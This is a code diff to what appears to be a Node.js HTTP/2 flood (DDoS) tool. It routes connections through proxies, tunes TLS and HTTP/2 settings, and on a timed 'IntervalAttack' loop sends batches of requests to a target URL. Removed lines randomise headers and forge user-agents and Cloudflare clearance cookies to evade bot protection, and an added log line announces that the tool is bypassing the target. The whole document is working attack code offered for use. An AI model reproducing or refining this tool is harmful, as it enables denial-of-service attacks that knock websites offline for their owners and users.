-     Socker.HTTP(proxyOptions, async (connection, error) => {
+     Socker.HTTP(proxyOptions, (connection, error) => {
          if (error) return
  
          connection.setKeepAlive(true, 600000);
 
          const tlsOptions = {
-            rejectUnauthorized: false,
             host: parsedTarget.host,
-            servername: parsedTarget.host,
-            socket: connection,
-            ecdhCurve: "X25519:prime256v1",
-            ciphers: cipper,
-            secureProtocol: "TLS_method",
+            port: 443,
+            secure: true,
             ALPNProtocols: ['h2'],
-            //session: crypto.randomBytes(16),
-            //timeout: 1000,
+            sigals: siga,
+            socket: connection,
+            ciphers: tls.getCiphers().join(":") + cipper,
+            ecdhCurve: "prime256v1:X25519",
+            host: parsedTarget.host,
+            rejectUnauthorized: false,
+            servername: parsedTarget.host,
+            secureProtocol: "TLS_method",
         };
 
-         const tlsConn = await tls.connect(443, parsedTarget.host, tlsOptions); 
+         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 
 
          tlsConn.setKeepAlive(true, 60000);
 
-         const client = await http2.connect(parsedTarget.href, {
-             protocol: "https",
+         const client = http2.connect(parsedTarget.href, {
+             protocol: "https:",
              settings: {
-            headerTableSize: 8192,
-            maxConcurrentStreams: 1000,
+            headerTableSize: 65536,
+            maxConcurrentStreams: 2000,
             initialWindowSize: 65535,
-            maxHeaderListSize: 16384,
-            maxFrameSize: 32768,
-            enablePush: false,
+            maxHeaderListSize: 65536,
+            enablePush: false
           },
-             maxSessionMemory: 3333,
+             maxSessionMemory: 64000,
              maxDeflateDynamicTableSize: 4294967295,
              createConnection: () => tlsConn,
              socket: connection,
          });
  
          client.settings({
-            headerTableSize: 8192,
-            maxConcurrentStreams: 1000,
-            initialWindowSize: 65535,
-            maxHeaderListSize: 16384,
-            maxFrameSize: 32768,
-            enablePush: false,
+            headerTableSize: 65536,
+            maxConcurrentStreams: 2000,
+            initialWindowSize: 6291456,
+            maxHeaderListSize: 65536,
+            enablePush: false
           });
-		 
-         client.on("connect", async () => {
+ 
+         client.on("connect", () => {
             const IntervalAttack = setInterval(() => {
-function shuffleObject(obj) {
-  const keys = Object.keys(obj);
-
-  for (let i = keys.length - 1; i > 0; i--) {
-    const j = Math.floor(Math.random() * (i + 1));
-    [keys[i], keys[j]] = [keys[j], keys[i]];
-  }
-
-  const shuffledObject = {};
-  for (const key of keys) {
-    shuffledObject[key] = obj[key];
-  }
-
-  return shuffledObject;
-}
-					const shuffledHeaders = shuffleObject({
-					...headers,
-					"cache-control": "max-age=0",
-					"upgrade-insecure-requests": "1",
-					"user-agent": generateRandomString(3,8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + nm1 + " Safari/537.36 " + generateRandomString(6,20),
-					"accept": accept,
-					"referer": "https://www.google.com",
-					"accept-language": lang,
-					"cookie": "PHPSESSID=" + randstr(32) + ";cf-clearance=" + generateRandomString(32,64),
-					"x-forwarded-proto": "https",
-					"x-https": "on",
-					...multi,
-					...rateHeaders[Math.floor(Math.random()*rateHeaders.length)],
-					...rateHeaders2[Math.floor(Math.random()*rateHeaders2.length)],
-					...rateHeaders3[Math.floor(Math.random()*rateHeaders3.length)],
-				    ...rateHeaders4[Math.floor(Math.random()*rateHeaders4.length)],
-					});
-				//const headersArray = [dynHeaders, dynHeaders1, dynHeaders2];
-				//console.log(dynHeaders2);
-				//console.log(shuffledHeaders);
                 for (let i = 0; i < args.Rate; i++) {
-					const request = client.request(shuffledHeaders);
-					//console.log(dynHeaders2);
-					
-                    client.on("response", response => {
+                    //headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
+                    const request = client.request(headers)
+                    
+                    .on("response", response => {
                         request.close();
                         request.destroy();
                         return
@@ -707,8 +492,7 @@ function shuffleObject(obj) {
     
                     request.end();
                 }
-            }, 700); 
-            //});
+            }, 1000); 
          });
  
          client.on("close", () => {
@@ -719,7 +503,6 @@ function shuffleObject(obj) {
      }),function (error, response, body) {
 		};
  }
- 
+ console.log(gradient.vice(`[+] 正在绕过目标…`));
  const KillScript = () => process.exit(1);
- 
  setTimeout(KillScript, args.time * 1000);
